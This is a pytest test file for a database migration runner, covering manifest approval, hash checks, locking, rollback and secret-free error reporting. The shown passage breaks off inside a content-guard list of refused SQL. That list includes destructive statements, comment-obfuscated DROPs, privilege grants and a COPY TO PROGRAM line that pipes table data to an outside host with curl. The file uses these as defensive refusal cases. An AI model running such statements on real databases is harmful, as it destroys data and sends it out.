"""The migration runner (db/migrate.py) without a database: who may run it, what the manifest accepts, when a
file is left alone (missing, mismatch, changed, refused, blocked), what happens inside the one transaction and
in what order, that a failure never leaves `run` and that nothing published carries SQL or a database message.
The SQL semantics are tested on a real PostgreSQL in tests/integration/test_migrate.py."""
from __future__ import annotations

import hashlib
import json
import logging
from pathlib import Path
from unittest.mock import MagicMock

import pytest

from db import migrate

A, B, C = "2099-01-01_zz_first.sql", "2099-01-02_zz_second.sql", "2099-01-03_zz_third.sql"
OK_SQL = "CREATE TABLE IF NOT EXISTS zz_a (id uuid PRIMARY KEY);\nALTER TABLE zz_a ENABLE ROW LEVEL SECURITY;\n"
APPROVAL = "# the owner, 2099-01-01, \"apply it\""


def sha(sql: str) -> str:
    return hashlib.sha256(sql.encode("utf-8")).hexdigest()


class FakeCursor:
    def __init__(self, conn):
        self.conn, self._result = conn, []

    def execute(self, sql, params=None):
        c = self.conn
        c.calls.append((sql, params))
        for needle, exc in c.fail.items():
            if needle in sql:
                raise exc
        if sql == migrate.LEDGER_EXISTS:
            self._result = [("schema_migrations" if c.table else None,)]
        elif sql == migrate.LEDGER_ALL:
            self._result = list(c.ledger.items())
        elif sql == migrate.LEDGER_ONE:
            self._result = [(c.ledger[params[0]],)] if params[0] in c.ledger else []
        elif sql == migrate.LEDGER_INSERT:
            c.staged[params[0]] = params[1]
        elif sql == migrate.LEDGER_CREATE:
            c.table = True
        elif sql == migrate.LOCK_TRY:
            if c.on_lock:
                c.on_lock(c)                  # what another process committed since the ledger was first read
            self._result = [(c.lock,)]        # False: another instance holds it
        else:
            self._result = []

    def fetchone(self):
        return self._result[0] if self._result else None

    def fetchall(self):
        return list(self._result)

    def close(self):
        pass


class FakeConn:
    """A DBAPI connection that records every call in order and keeps a ledger the way a transaction would."""
    autocommit = False

    def __init__(self, ledger=None, table=True, fail=None, on_lock=None, lock=True):
        self.ledger, self.table, self.fail, self.on_lock, self.lock = dict(ledger or {}), table, dict(fail or {}), on_lock, lock
        self.calls, self.staged = [], {}

    def cursor(self):
        return FakeCursor(self)

    def commit(self):
        self.calls.append("COMMIT")
        self.ledger.update(self.staged); self.staged = {}

    def rollback(self):
        self.calls.append("ROLLBACK")
        self.staged = {}

    def close(self):
        self.calls.append("CLOSE")

    def sql(self):
        return [c[0] for c in self.calls if isinstance(c, tuple)]


READ = ["SET LOCAL lock_timeout = '2s'", "SET LOCAL statement_timeout = '10s'"]      # the first read never queues for long
READ_CALLS = [(q, None) for q in READ]


def engine_for(conn):
    e = MagicMock()
    e.raw_connection.return_value = conn
    return e


@pytest.fixture
def on(monkeypatch):
    """This process may migrate, and starts with no memory of an earlier run."""
    monkeypatch.setenv("RIJEKA_MIGRATE", "1")
    monkeypatch.delenv("RENDER", raising=False)
    saved = dict(migrate._last)
    migrate._last.update(at=None, applied=[], problems={})
    yield
    migrate._last.update(saved)


def book(tmp_path: Path, files: dict, flags: dict | None = None, hashes: dict | None = None) -> tuple[Path, Path]:
    """Write the files and a manifest approving them; returns (manifest, directory)."""
    d = tmp_path / "migrations"
    d.mkdir(exist_ok=True)
    lines = ["# a test manifest", ""]
    for name, sql in files.items():
        if sql is not None:
            (d / name).write_bytes(sql.encode("utf-8"))
        h = (hashes or {}).get(name) or sha(sql or "")
        lines.append(f"{name}  {h}  {(flags or {}).get(name, '-')}  {APPROVAL}")
    m = tmp_path / "approved.txt"
    m.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return m, d


# ── enabled() ────────────────────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("env, expected", [
    ({}, False),                                             # a developer's shell: never
    ({"RENDER": "true"}, True),                              # the deployed service
    ({"RENDER": ""}, False),
    ({"RENDER": "  "}, False),
    ({"RIJEKA_MIGRATE": "1"}, True),
    ({"RIJEKA_MIGRATE": "true"}, True),
    ({"RIJEKA_MIGRATE": "YES"}, True),
    ({"RIJEKA_MIGRATE": " on "}, True),
    ({"RIJEKA_MIGRATE": "0"}, False),
    ({"RIJEKA_MIGRATE": "0", "RENDER": "true"}, False),      # off everywhere, Render included
    ({"RIJEKA_MIGRATE": "false", "RENDER": "true"}, False),
    ({"RIJEKA_MIGRATE": "off", "RENDER": "true"}, False),
    ({"RIJEKA_MIGRATE": "no", "RENDER": "true"}, False),
    ({"RIJEKA_MIGRATE": "", "RENDER": "true"}, False),       # set but empty is not "unset": closed
    ({"RIJEKA_MIGRATE": "maybe", "RENDER": "true"}, False),  # a typo is closed
    ({"RIJEKA_MIGRATE": "1", "RENDER": "true"}, True),
    ({"RIJEKA_MIGRATE": "auto", "RENDER": "true"}, True),    # auto is the same as unset, as RIJEKA_SCHEDULER=auto is
    ({"RIJEKA_MIGRATE": " AUTO ", "RENDER": "true"}, True),
    ({"RIJEKA_MIGRATE": "auto"}, False),                     # ... so a developer's shell stays off
    ({"RIJEKA_MIGRATE": "auto", "RENDER": ""}, False),
    ({"RIJEKA_MIGRATE": "automatic", "RENDER": "true"}, False),
])
def test_enabled_in_every_environment(env, expected):
    assert migrate.enabled(env) is expected


def test_enabled_reads_the_process_environment(monkeypatch):
    monkeypatch.delenv("RIJEKA_MIGRATE", raising=False)
    monkeypatch.delenv("RENDER", raising=False)
    assert migrate.enabled() is False
    monkeypatch.setenv("RENDER", "true")
    assert migrate.enabled() is True
    monkeypatch.setenv("RIJEKA_MIGRATE", "0")
    assert migrate.enabled() is False


def test_a_shell_that_may_not_migrate_never_touches_the_engine(tmp_path, monkeypatch):
    monkeypatch.delenv("RIJEKA_MIGRATE", raising=False)
    monkeypatch.delenv("RENDER", raising=False)
    m, d = book(tmp_path, {A: OK_SQL})
    engine = MagicMock()
    out = migrate.run(engine, m, d)
    assert engine.raw_connection.call_count == 0
    assert out["enabled"] is False and out["pending"] == [A] and out["applied"] == []


# ── the manifest ─────────────────────────────────────────────────────────────────────────────────

def test_manifest_parses_entries_comments_and_flags_in_file_name_order(tmp_path):
    h1, h2 = "a" * 64, "0123456789abcdef" * 4
    p = tmp_path / "m.txt"
    p.write_text(f"# header\n\n   # an indented comment\n{B}  {h2}  destructive  # Miko, 2099-01-02, \"yes, drop it\"\n"
                 f"{A}\t{h1}\t-\t# Miko, 2099-01-01, \"apply # it\"\n", encoding="utf-8")
    got = migrate.manifest(p)
    assert [e.name for e in got] == [A, B]
    assert got[0] == migrate.Entry(A, h1, frozenset(), 'Miko, 2099-01-01, "apply # it"')
    assert got[1].flags == {"destructive"} and got[1].sha256 == h2


H = "a" * 64


@pytest.mark.parametrize("line, why", [
    (f"{A}  {H}  # approved", "expected"),                                   # no flags field
    (f"{A}  {H}  -  extra  # approved", "expected"),                         # a fourth field
    (f"{A}  # approved", "expected"),
    (f"../{A}  {H}  -  # approved", "file name"),                            # a path
    (f"docs/migrations/{A}  {H}  -  # approved", "file name"),
    (f"..\\{A}  {H}  -  # approved", "file name"),
    (f"2099-01-01_ZZ.sql  {H}  -  # approved", "file name"),                 # upper case
    (f"zz_first.sql  {H}  -  # approved", "file name"),                      # no date
    (f"2099-01-01_zz.sql.bak  {H}  -  # approved", "file name"),
    (f"2099-01-01_zz.py  {H}  -  # approved", "file name"),
    (f"{A}  {'a' * 63}  -  # approved", "sha256"),
    (f"{A}  {'a' * 65}  -  # approved", "sha256"),
    (f"{A}  {'A' * 64}  -  # approved", "sha256"),
    (f"{A}  {'g' * 64}  -  # approved", "sha256"),
    (f"{A}  {H}  force  # approved", "flag"),
    (f"{A}  {H}  destructive,force  # approved", "flag"),
    (f"{A}  {H}  destructive,  # approved", "flag"),
    (f"{A}  {H}  -", "approval"),                                            # nobody approved it
    (f"{A}  {H}  -  #", "approval"),
    (f"{A}  {H}  -  #   ", "approval"),
    (f"{A}  {H}  -  # approved\n{A}  {H}  -  # approved again", "twice"),
])
def test_manifest_rejects_a_line_that_does_not_parse(tmp_path, line, why):
    p = tmp_path / "m.txt"
    p.write_text(f"# header\n{B}  {H}  -  # fine\n{line}\n", encoding="utf-8")
    with pytest.raises(migrate.ManifestError) as e:
        migrate.manifest(p)
    assert why in str(e.value) and str(e.value).startswith("line ")
    assert H not in str(e.value) and "approved" not in str(e.value)          # the message is written here, the line is not echoed


def test_manifest_missing_or_unreadable_is_an_error_and_applies_nothing(tmp_path, on):
    with pytest.raises(migrate.ManifestError):
        migrate.manifest(tmp_path / "nope.txt")
    (tmp_path / "bin.txt").write_bytes(b"\xff\xfe\x00")
    with pytest.raises(migrate.ManifestError):
        migrate.manifest(tmp_path / "bin.txt")
    engine = MagicMock()
    out = migrate.run(engine, tmp_path / "nope.txt", tmp_path)
    assert engine.raw_connection.call_count == 0 and "manifest" in out["problems"] and out["applied"] == []


def test_a_bad_manifest_line_stops_everything(tmp_path, on):
    m, d = book(tmp_path, {A: OK_SQL})
    m.write_text(m.read_text() + "this line is not an entry\n")
    engine = MagicMock()
    out = migrate.run(engine, m, d)
    assert engine.raw_connection.call_count == 0
    assert out["problems"] == {"manifest": "line 4: expected a file name, a sha256 and flags (or -), then the approval"}


def test_the_real_manifest_its_approved_copies_and_their_originals_agree():
    """On the repository's own files. Every manifest line has its copy in db/approved; every file there has a
    manifest line, hashes to it and is byte-identical to docs/migrations/<same name>. CI fails when someone
    edits an approved copy or its original, drops a file in db/approved without an approval, or approves a
    file the guard refuses without the flag. Empty today; it checks from the first entry on."""
    assert migrate.MANIFEST == Path(migrate.__file__).resolve().parent / "migrations_approved.txt"
    assert migrate.APPROVED_DIR == Path(migrate.__file__).resolve().parent / "approved"
    assert migrate.BACKEND in migrate.APPROVED_DIR.parents                   # the runner needs nothing outside backend/
    assert migrate.ORIGINALS_DIR == Path(migrate.__file__).resolve().parents[2] / "docs" / "migrations" and migrate.ORIGINALS_DIR.is_dir()
    entries = {e.name: e for e in migrate.manifest()}                        # parses, strictly
    copies = sorted(p.name for p in migrate.APPROVED_DIR.iterdir() if p.name != "README.md")
    assert copies == sorted(entries), "db/approved and the manifest do not list the same files"
    for name in copies:
        data = (migrate.APPROVED_DIR / name).read_bytes()
        assert hashlib.sha256(data).hexdigest() == entries[name].sha256, f"{name}: the approved copy was edited after it was approved"
        original = migrate.ORIGINALS_DIR / name
        assert original.is_file(), f"{name}: no original in docs/migrations"
        assert original.read_bytes() == data, f"{name}: docs/migrations and db/approved differ"
    assert migrate.check() == {}
    assert (migrate.APPROVED_DIR / "README.md").is_file()


def test_the_runner_reads_sql_only_from_the_approved_directory(tmp_path, on, monkeypatch):
    """An original in docs/migrations is never applied: without its copy the entry is `missing`."""
    originals = tmp_path / "docs_migrations"
    originals.mkdir()
    (originals / A).write_text(OK_SQL)
    monkeypatch.setattr(migrate, "ORIGINALS_DIR", originals)
    monkeypatch.setattr(migrate, "APPROVED_DIR", tmp_path / "approved_not_made_yet")
    m, _ = book(tmp_path, {A: None}, hashes={A: sha(OK_SQL)})
    monkeypatch.setattr(migrate, "MANIFEST", m)
    conn = FakeConn()
    out = migrate.run(engine_for(conn))                                      # the module's own paths, as the deployed process uses them
    assert out["problems"] == {A: "missing"} and OK_SQL not in conn.sql() and "COMMIT" not in conn.calls
    assert migrate.stage(A) == f"{A}  {sha(OK_SQL)}  -"
    conn = FakeConn()
    assert migrate.run(engine_for(conn))["applied"] == [A] and OK_SQL in conn.sql()


# ── when a file is left alone ────────────────────────────────────────────────────────────────────

def test_an_empty_manifest_does_not_contact_the_database(tmp_path, on):
    m, d = book(tmp_path, {})
    engine = MagicMock()
    out = migrate.run(engine, m, d)
    assert engine.raw_connection.call_count == 0
    assert out == {"enabled": True, "applied": [], "pending": [], "problems": {}, "last_run": out["last_run"]} and out["last_run"]


def test_applied_with_the_same_hash_is_skipped_without_a_write(tmp_path, on):
    m, d = book(tmp_path, {A: OK_SQL})
    conn = FakeConn(ledger={A: sha(OK_SQL)})
    out = migrate.run(engine_for(conn), m, d)
    assert out["applied"] == [A] and out["pending"] == [] and out["problems"] == {}
    assert conn.sql() == [*READ, migrate.LEDGER_EXISTS, migrate.LEDGER_ALL]  # two reads, nothing else
    assert "COMMIT" not in conn.calls and conn.calls[-1] == "CLOSE"


def test_an_applied_file_missing_from_disk_is_still_applied(tmp_path, on):
    m, d = book(tmp_path, {A: None}, hashes={A: H})                          # an image built from backend/ alone
    conn = FakeConn(ledger={A: H})
    out = migrate.run(engine_for(conn), m, d)
    assert out["applied"] == [A] and out["problems"] == {}


def test_sha_mismatch_is_reported_and_nothing_is_done(tmp_path, on):
    m, d = book(tmp_path, {A: OK_SQL, B: OK_SQL.replace("zz_a", "zz_b")})
    (d / A).write_text(OK_SQL + "DROP TABLE trades;\n")                      # edited after the approval
    conn = FakeConn(table=False)
    out = migrate.run(engine_for(conn), m, d)
    assert out["problems"] == {A: "mismatch", B: migrate.BLOCKED} and out["applied"] == [] and out["pending"] == [A, B]
    assert conn.sql() == [*READ, migrate.LEDGER_EXISTS] and "COMMIT" not in conn.calls   # no lock, no DDL, no file


def test_changed_after_applied_is_reported_and_does_not_block_the_next(tmp_path, on):
    m, d = book(tmp_path, {A: OK_SQL, B: OK_SQL.replace("zz_a", "zz_b")})
    conn = FakeConn(ledger={A: "b" * 64})                                    # applied earlier with other bytes
    out = migrate.run(engine_for(conn), m, d)
    assert out["problems"] == {A: "changed"} and out["applied"] == [B] and out["pending"] == []
    assert OK_SQL not in conn.sql() and conn.ledger[A] == "b" * 64           # never applied again, the ledger keeps its hash
    assert conn.ledger[B] == sha(OK_SQL.replace("zz_a", "zz_b"))


def test_missing_file_is_reported_and_nothing_is_done(tmp_path, on):
    m, d = book(tmp_path, {A: None, B: OK_SQL}, hashes={A: H})
    conn = FakeConn()
    out = migrate.run(engine_for(conn), m, d)
    assert out["problems"] == {A: "missing", B: migrate.BLOCKED} and out["applied"] == []
    assert conn.sql() == [*READ, migrate.LEDGER_EXISTS, migrate.LEDGER_ALL] and "COMMIT" not in conn.calls


def test_another_process_applied_it_between_the_first_read_and_the_lock(tmp_path, on):
    m, d = book(tmp_path, {A: OK_SQL})
    conn = FakeConn(on_lock=lambda c: c.ledger.update({A: sha(OK_SQL)}))
    out = migrate.run(engine_for(conn), m, d)
    assert out["applied"] == [A] and out["problems"] == {}
    assert OK_SQL not in conn.sql() and migrate.LEDGER_INSERT not in conn.sql() and "COMMIT" not in conn.calls

    conn = FakeConn(on_lock=lambda c: c.ledger.update({A: "c" * 64}))        # ... with other bytes
    out = migrate.run(engine_for(conn), m, d)
    assert out["problems"] == {A: "changed"} and OK_SQL not in conn.sql()


def test_the_lock_is_tried_never_waited_for_and_a_busy_run_applies_nothing(tmp_path, on):
    assert "pg_try_advisory_xact_lock" in migrate.LOCK_TRY
    assert "pg_advisory_xact_lock(" not in Path(migrate.__file__).read_text().split('"""', 2)[2]      # no waiting form anywhere in the code
    files = {A: OK_SQL, B: OK_SQL.replace("zz_a", "zz_b"), C: OK_SQL.replace("zz_a", "zz_c")}
    m, d = book(tmp_path, files)
    conn = FakeConn(ledger={A: sha(OK_SQL)}, lock=False)                     # another instance holds it
    out = migrate.run(engine_for(conn), m, d)
    assert out["applied"] == [A] and out["pending"] == [B, C] and out["problems"] == {"run": migrate.BUSY}
    assert conn.calls == [
        *READ_CALLS, (migrate.LEDGER_EXISTS, None), (migrate.LEDGER_ALL, None), "ROLLBACK",
        "ROLLBACK", (migrate.LOCK_TRY, None), "ROLLBACK",                    # one try, before anything that could wait, then nothing more
        "CLOSE",
    ]
    assert migrate.status(m)["problems"] == {"run": "busy: another instance is applying"}
    # an entry applied in the ledger is still reported applied when it sorts after the one that met the lock
    conn = FakeConn(ledger={C: sha(files[C])}, lock=False)
    out = migrate.run(engine_for(conn), m, d)
    assert out["applied"] == [C] and out["pending"] == [A, B] and conn.sql().count(migrate.LOCK_TRY) == 1
    # the next start finds the lock free and applies
    conn = FakeConn()
    out = migrate.run(engine_for(conn), m, d)
    assert out["applied"] == [A, B, C] and out["problems"] == {}


def test_an_autocommit_connection_is_refused(tmp_path, on):
    m, d = book(tmp_path, {A: OK_SQL})
    conn = FakeConn()
    conn.autocommit = True                                                   # the lock and the timeouts would not hold
    out = migrate.run(engine_for(conn), m, d)
    assert out["problems"] == {"database": "failed: the connection is in autocommit"} and conn.sql() == []


# ── the transaction ──────────────────────────────────────────────────────────────────────────────

def test_the_order_inside_the_transaction(tmp_path, on, monkeypatch):
    monkeypatch.setenv("RENDER_SERVICE_NAME", "rijeka-api")
    monkeypatch.setenv("RENDER_GIT_COMMIT", "0123456789abcdef0123")
    sql = OK_SQL + "CREATE FUNCTION zz_f() RETURNS text LANGUAGE sql AS $$ SELECT '100%' $$;\n"
    m, d = book(tmp_path, {A: sql})
    conn = FakeConn(table=False)
    out = migrate.run(engine_for(conn), m, d)
    assert out["applied"] == [A] and out["problems"] == {}
    assert conn.calls == [
        ("SET LOCAL lock_timeout = '2s'", None),                             # the first read: a locked ledger is `busy` after this
        ("SET LOCAL statement_timeout = '10s'", None),
        (migrate.LEDGER_EXISTS, None),
        "ROLLBACK",                                                          # the read is over
        "ROLLBACK",                                                          # a clean transaction: the lock is its first statement
        (f"SELECT pg_try_advisory_xact_lock({migrate.ADVISORY_LOCK_KEY})", None),   # tried, never waited for
        ("SET LOCAL lock_timeout = '5s'", None),
        ("SET LOCAL statement_timeout = '60s'", None),
        ("SET LOCAL standard_conforming_strings = on", None),
        ("SET LOCAL search_path = public, extensions", None),                # unqualified names land in public
        (migrate.LEDGER_EXISTS, None),
        (migrate.LEDGER_CREATE, None),                                       # only because it is not there
        (migrate.LEDGER_RLS, None),
        (migrate.LEDGER_ONE, (A,)),                                          # read again under the lock
        (sql, None),                                                         # the file's exact text, one call, no parameters
        (migrate.LEDGER_INSERT, (A, sha(sql), 3, "rijeka-api@0123456789ab")),
        "COMMIT",
        "CLOSE",
    ]
    assert -2**63 <= migrate.ADVISORY_LOCK_KEY < 2**63
    assert "CREATE TABLE IF NOT EXISTS public.schema_migrations" in migrate.LEDGER_CREATE
    assert migrate.LEDGER_RLS == "ALTER TABLE public.schema_migrations ENABLE ROW LEVEL SECURITY"
    for q in (migrate.LEDGER_EXISTS, migrate.LEDGER_ALL, migrate.LEDGER_ONE, migrate.LEDGER_INSERT):
        assert "public.schema_migrations" in q                               # never by the search path


def test_a_ledger_that_exists_is_never_altered_and_a_locked_one_is_busy(tmp_path, on):
    """DDL on the ledger at every apply locked it against the instance starting beside this one."""
    m, d = book(tmp_path, {A: OK_SQL, B: OK_SQL.replace("zz_a", "zz_b")})
    conn = FakeConn()                                                        # the ledger is there
    out = migrate.run(engine_for(conn), m, d)
    assert out["applied"] == [A, B] and migrate.LEDGER_CREATE not in conn.sql() and migrate.LEDGER_RLS not in conn.sql()
    conn = FakeConn(table=False)                                             # created once, by the first migration only
    out = migrate.run(engine_for(conn), m, d)
    assert out["applied"] == [A, B] and conn.sql().count(migrate.LEDGER_CREATE) == 1 and conn.sql().count(migrate.LEDGER_RLS) == 1
    # every statement that touches the ledger inside a migration comes after the lock and the lock timeout
    q = conn.sql()
    lock, timeout = q.index(migrate.LOCK_TRY), q.index("SET LOCAL lock_timeout = '5s'")
    assert lock < timeout < min(i for i, x in enumerate(q) if i > lock and "schema_migrations" in x)

    class Locked(Exception):
        pgcode = "55P03"                                                     # lock_not_available: the read gave up after its two seconds
    conn = FakeConn(fail={migrate.LEDGER_ALL: Locked("canceling statement due to lock timeout")})
    out = migrate.run(engine_for(conn), m, d)
    assert out["problems"] == {"run": migrate.BUSY} and out["applied"] == [] and out["pending"] == [A, B]
    assert migrate.LOCK_TRY not in conn.sql() and "COMMIT" not in conn.calls and conn.calls[-1] == "CLOSE"


def test_each_migration_has_its_own_transaction_in_file_name_order(tmp_path, on):
    files = {C: OK_SQL.replace("zz_a", "zz_c"), A: OK_SQL, B: OK_SQL.replace("zz_a", "zz_b")}
    m, d = book(tmp_path, files)
    conn = FakeConn()
    out = migrate.run(engine_for(conn), m, d)
    assert out["applied"] == [A, B, C]
    ran = [s for s in conn.sql() if s in files.values()]
    assert ran == [files[A], files[B], files[C]]
    assert conn.calls.count("COMMIT") == 3 and conn.sql().count(migrate.LOCK_TRY) == 3


class Boom(Exception):
    pgcode = "42P01"


SECRET = "postgresql://postgres.ref:hunter2@aws-0.pooler.supabase.com:6543/postgres"


def test_a_failure_does_not_raise_rolls_back_and_stops_the_run(tmp_path, on, caplog):
    bad = "CREATE TABLE zz_marker_table (id int);\nALTER TABLE zz_marker_table ENABLE ROW LEVEL SECURITY;\nSELECT zz_marker_function();\n"
    m, d = book(tmp_path, {A: OK_SQL, B: bad, C: OK_SQL.replace("zz_a", "zz_c")})
    conn = FakeConn(fail={"zz_marker_function": Boom(f'relation "zz_marker_table" does not exist in {SECRET}\nLINE 1: {bad}')})
    with caplog.at_level(logging.DEBUG):
        out = migrate.run(engine_for(conn), m, d)                            # does not raise
    assert out["applied"] == [A] and out["pending"] == [B, C]
    assert out["problems"] == {B: "failed: Boom 42P01", C: migrate.BLOCKED}
    i = conn.sql().index(bad)
    after = conn.calls[conn.calls.index((bad, None)) + 1:]
    assert after == ["ROLLBACK", "CLOSE"]                                    # no ledger row, no commit, the third never started
    assert migrate.LEDGER_INSERT not in conn.sql()[i:] and B not in conn.ledger and C not in conn.ledger
    for published in (json.dumps(out), json.dumps(migrate.status(m)), caplog.text):
        assert "zz_marker" not in published and "hunter2" not in published and "supabase" not in published and "LINE 1" not in published


def test_a_failure_to_connect_is_reported_without_the_drivers_message(tmp_path, on, caplog):
    m, d = book(tmp_path, {A: OK_SQL})
    engine = MagicMock()
    engine.raw_connection.side_effect = RuntimeError(f"could not connect to {SECRET}")
    with caplog.at_level(logging.DEBUG):
        out = migrate.run(engine, m, d)
    assert out["problems"] == {"database": "failed: RuntimeError"} and out["pending"] == [A]
    assert "hunter2" not in json.dumps(out) + caplog.text


@pytest.mark.parametrize("needle", ["to_regclass", "pg_try_advisory_xact_lock", "lock_timeout", "CREATE TABLE IF NOT EXISTS public.schema_migrations",
                                    "INSERT INTO public.schema_migrations"])
def test_a_failure_at_any_step_is_reported_and_never_raised(tmp_path, on, needle):
    m, d = book(tmp_path, {A: OK_SQL})
    conn = FakeConn(table=False, fail={needle: Boom("x")})
    out = migrate.run(engine_for(conn), m, d)
    assert out["applied"] == [] and "COMMIT" not in conn.calls and conn.calls[-1] == "CLOSE"
    assert list(out["problems"].values()) == ["failed: Boom 42P01"] and A not in conn.ledger


def test_a_failing_commit_or_close_is_contained(tmp_path, on):
    m, d = book(tmp_path, {A: OK_SQL})
    conn = FakeConn()
    conn.commit = MagicMock(side_effect=Boom("x"))
    conn.close = MagicMock(side_effect=Boom("x"))
    out = migrate.run(engine_for(conn), m, d)
    assert out["problems"] == {A: "failed: Boom 42P01"} and out["applied"] == []


def test_run_survives_anything(tmp_path, on, monkeypatch):
    m, d = book(tmp_path, {A: OK_SQL})
    monkeypatch.setattr(migrate, "preflight", MagicMock(side_effect=MemoryError(SECRET)))
    out = migrate.run(engine_for(FakeConn()), m, d)
    assert out["problems"] == {"runner": "failed: MemoryError"} and out["applied"] == []


def test_status_carries_names_and_reason_words_only(tmp_path, on):
    marker = "CREATE TABLE zz_secret_marker (id int);\nDROP TABLE zz_secret_marker;\n"
    m, d = book(tmp_path, {A: OK_SQL, B: marker})
    conn = FakeConn()
    migrate.run(engine_for(conn), m, d)
    s = migrate.status(m)
    assert set(s) == {"enabled", "applied", "pending", "problems", "last_run"}
    assert s["enabled"] is True and s["applied"] == [A] and s["pending"] == [B] and s["problems"] == {B: "refused: DROP TABLE"}
    text_ = json.dumps(s)
    assert "zz_secret_marker" not in text_ and "CREATE" not in text_ and sha(marker) not in text_ and "the owner" not in text_
    # a reason that is not this module's vocabulary is not published as it is
    migrate._last["problems"] = {A: "x" * 500, B: "SELECT *\nFROM t; 'quoted'"}
    assert migrate.status(m)["problems"] == {A: "failed", B: "failed"}
    # and the status of the real manifest never shows a run made on another one
    assert set(migrate.status()["problems"]) <= {"manifest", "database", "runner"} | {e.name for e in migrate.manifest()}


def test_status_before_any_run_and_with_a_broken_manifest(tmp_path, on):
    m, d = book(tmp_path, {A: OK_SQL, B: OK_SQL})
    assert migrate.status(m) == {"enabled": True, "applied": [], "pending": [A, B], "problems": {}, "last_run": None}
    m.write_text("nonsense\n")
    s = migrate.status(m)                                                    # never raises
    assert s["pending"] == [] and s["problems"] == {"manifest": "line 1: expected a file name, a sha256 and flags (or -), then the approval"}


# ── the content guard ────────────────────────────────────────────────────────────────────────────

REFUSED = [
    ("DROP TABLE trades;", "DROP TABLE"),
    ("drop   table if exists public.trades cascade;", "DROP TABLE"),
    ("DROP/* x */TABLE trades;", "DROP TABLE"),
    ("DROP -- why not\n TABLE trades;", "DROP TABLE"),
    ("DROP SCHEMA public CASCADE;", "DROP SCHEMA"),
    ("DROP DATABASE postgres;", "DROP DATABASE"),
    ("TRUNCATE trades;", "TRUNCATE"),
    ("truncate table trades, cashflows;", "TRUNCATE"),
    ("DELETE FROM trades;", "DELETE FROM"),
    ("WITH gone AS (DELETE\nFROM trades RETURNING id) SELECT count(*) FROM gone;", "DELETE FROM"),
    ("ALTER ROLE authenticator SET statement_timeout = 0;", "ALTER ROLE"),
    ("CREATE ROLE intruder LOGIN;", "CREATE ROLE"),
    ("GRANT ALL ON trades TO anon;", "GRANT to anon, authenticated or PUBLIC"),
    ("GRANT SELECT ON trades TO service_role, authenticated;", "GRANT to anon, authenticated or PUBLIC"),
    ("grant select on all tables in schema public to public;", "GRANT to anon, authenticated or PUBLIC"),
    ('GRANT SELECT ON "a;b" TO "anon";', "GRANT to anon, authenticated or PUBLIC"),
    ("ALTER TABLE trades DISABLE ROW LEVEL SECURITY;", "DISABLE ROW LEVEL SECURITY"),
    ("alter table trades disable  row\nlevel security;", "DISABLE ROW LEVEL SECURITY"),
    ("COPY trades TO PROGRAM 'curl -d @- example.org';", "COPY"),
    ("COPY (SELECT * FROM profiles) TO '/tmp/x';", "COPY"),
    # a DO block runs at once: its body is code, not a stored string
    ("DO $$ BEGIN DROP TABLE trades; END $$;", "DROP TABLE"),
    ("DO LANGUAGE plpgsql $do$ BEGIN IF true THEN TRUNCATE trades; END IF; END $do$;", "TRUNCATE"),
    ("CREATE TABLE zz (id int);\nDO $a$ BEGIN DELETE FROM trades; END $a$ LANGUAGE plpgsql;", "DELETE FROM"),
    ("DO 'BEGIN DROP TABLE trades; END';", "DROP TABLE"),                     # the body as a plain string
    ("DO LANGUAGE 'plpgsql' $$ BEGIN TRUNCATE trades; END $$;", "TRUNCATE"),
    ("DO $$ BEGIN EXECUTE 'DROP TABLE trades'; END $$;", "DROP TABLE"),       # inside a DO body a literal may be run
    ("DO $$ BEGIN EXECUTE $q$ DELETE FROM trades $q$; END $$;", "DELETE FROM"),
    ("DO $$ BEGIN DO $in$ BEGIN DROP TABLE trades; END $in$; END $$;", "DROP TABLE"),
    ("-- a header\n\n  /* and a note */\n  do $$ BEGIN DROP TABLE trades; END $$;", "DROP TABLE"),
    ("SELECT 1;do\n$$ BEGIN DROP TABLE trades; END $$;", "DROP TABLE"),
    # Edgar's review: a column, and a table nobody locked down
    ("ALTER TABLE trades DROP COLUMN notional;", "DROP COLUMN"),
    ("ALTER TABLE trades DROP IF EXISTS notional;", "DROP COLUMN"),                     # COLUMN is optional
    ("ALTER TABLE ONLY public.trades ADD COLUMN a int, DROP CONSTRAINT IF EXISTS c, DROP COLUMN b CASCADE;", "DROP COLUMN"),
    ("DO $$ BEGIN ALTER TABLE trades DROP COLUMN notional; END $$;", "DROP COLUMN"),
    ("CREATE TABLE zz (id int);", migrate.RLS_RULE),
    ("CREATE TABLE IF NOT EXISTS public.zz (id int); CREATE INDEX ix ON zz (id);", migrate.RLS_RULE),
    ("CREATE TABLE zz (id int); CREATE TABLE zz_other (id int); ALTER TABLE zz ENABLE ROW LEVEL SECURITY;", migrate.RLS_RULE),
    ("CREATE TABLE zz (id int); ALTER TABLE zz FORCE ROW LEVEL SECURITY;", migrate.RLS_RULE),
    ("CREATE UNLOGGED TABLE zz AS SELECT 1 AS id;", migrate.RLS_RULE),
    ("DO $$ BEGIN CREATE TABLE zz (id int); END $$;", migrate.RLS_RULE),
    # Magnus's review: what passed and must not
    ("DO $$ BEGIN EXECUTE 'DROP/**/TABLE t'; END $$;", "DROP TABLE"),
    ("DO $$ BEGIN EXECUTE 'DROP --x\n TABLE t'; END $$;", "DROP TABLE"),
    ("DO $$ BEGIN EXECUTE $q$DROP/**/TABLE t$q$; END $$;", "DROP TABLE"),
    ("DO $$ BEGIN EXECUTE 'ALTER TABLE t DISABLE/**/ROW LEVEL SECURITY'; END $$;", "DISABLE ROW LEVEL SECURITY"),
    ("DO $$ BEGIN EXECUTE 'ALTER TABLE t DISABLE -- x\n ROW LEVEL SECURITY'; END $$;", "DISABLE ROW LEVEL SECURITY"),
    ("DO $$ BEGIN EXECUTE 'SELECT ''--''; DROP/**/TABLE t'; END $$;", "DROP TABLE"),     # a comment mark inside a literal inside the literal
    ("DO $$ BEGIN EXECUTE 'it''s DROP/**/TABLE t'; END $$;", "DROP TABLE"),            # text that is not SQL: still read without its comments
    ("DO $$ BEGIN EXECUTE 'EXECUTE ''DROP/**/TABLE t'' '; END $$;", "DROP TABLE"),
    ("CREATE POLICY p ON zz FOR SELECT TO anon USING (true);", "policy for anon or PUBLIC"),
    ("CREATE POLICY p ON zz TO authenticated, anon USING (true);", "policy for anon or PUBLIC"),
    ('create policy p on zz for all to public using (true);', "policy for anon or PUBLIC"),
    ('ALTER POLICY p ON zz TO "anon";', "policy for anon or PUBLIC"),
    ("DROP OWNED BY authenticated;", "DROP OWNED"),
    ("ALTER PUBLICATION supabase_realtime ADD TABLE public.profiles;", "ALTER PUBLICATION"),
